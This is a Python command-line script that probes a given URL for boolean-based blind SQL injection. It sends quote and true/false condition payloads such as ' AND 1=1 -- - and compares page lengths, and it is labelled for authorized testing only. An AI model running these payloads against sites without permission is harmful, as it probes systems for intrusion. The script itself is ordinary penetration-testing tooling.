#!/usr/bin/env python3
import requests
import argparse

class SQLInjection:
    def __init__(self, url, true_payload, false_payload):
        self.url = url
        self.true_payload = true_payload
        self.false_payload = false_payload
        self.baseline_size = None
        self.truncated_size = None

    def get_baseline_size(self):
        if self.baseline_size is not None:
            return self.baseline_size, self.truncated_size

        baseline = requests.get(self.url)
        self.baseline_size = len(baseline.text)
        print(f"[+] Baseline URL size: {self.baseline_size}...")

        truncated = requests.get(self.url + "'")
        self.truncated_size = len(truncated.text)

        if self.truncated_size < self.baseline_size:
            print("[+] Web page truncated. Continuing with testing...")
        elif self.truncated_size == self.baseline_size:
            print("[*] Page unchanged by a lone quote; boolean-length test may be unreliable.")
        else:
            print("[*] Truncated page is larger than baseline; results may be unreliable.")

        return self.baseline_size, self.truncated_size

    def positive_boolean_test(self, true_payload):
        baseline_size, truncated_size = self.get_baseline_size()
        response_length = len(requests.get(self.url + true_payload).text)
        # A TRUE condition should render like the normal (baseline) page.
        if response_length >= baseline_size:
            print(f"[+] True boolean confirmed: {true_payload}...")
            return True
        print(f"[*] True payload did not work: {true_payload}...")
        return False

    def negative_boolean_test(self, false_payload):
        baseline_size, truncated_size = self.get_baseline_size()
        response_length = len(requests.get(self.url + false_payload).text)
        # A FALSE condition should NOT match the baseline (fewer/no rows).
        if response_length < baseline_size:
            print(f"[+] False boolean confirmed: {false_payload}...")
            return True
        print(f"[*] False payload did not work: {false_payload}...")
        return False

    def sqli_test(self):
        true_ok = self.positive_boolean_test(self.true_payload)
        false_ok = self.negative_boolean_test(self.false_payload)
        if true_ok and false_ok:
            print(f"[+] SQLi confirmed! true={self.true_payload!r} false={self.false_payload!r}")
            return True
        print("[-] SQLi not confirmed for this pair...")
        return False


def main():
    parser = argparse.ArgumentParser(description="Boolean-based blind SQLi detector (authorized testing only)")
    parser.add_argument("url", help="URL to test")
    args = parser.parse_args()

    TRUE_PAYLOADS = ["' AND 1=1 -- -", " AND 1=1--", "' AND 'a'='a"]
    FALSE_PAYLOADS = ["' AND '1'='2", " AND 1=2--", "' AND 'a'='b"]

    for true_payload in TRUE_PAYLOADS:
        for false_payload in FALSE_PAYLOADS:
            sqli = SQLInjection(args.url, true_payload, false_payload)
            if sqli.sqli_test():
                return  # stop at first confirmed pair
    print("[-] No payload pair confirmed SQLi.")


if __name__ == "__main__":
    main()
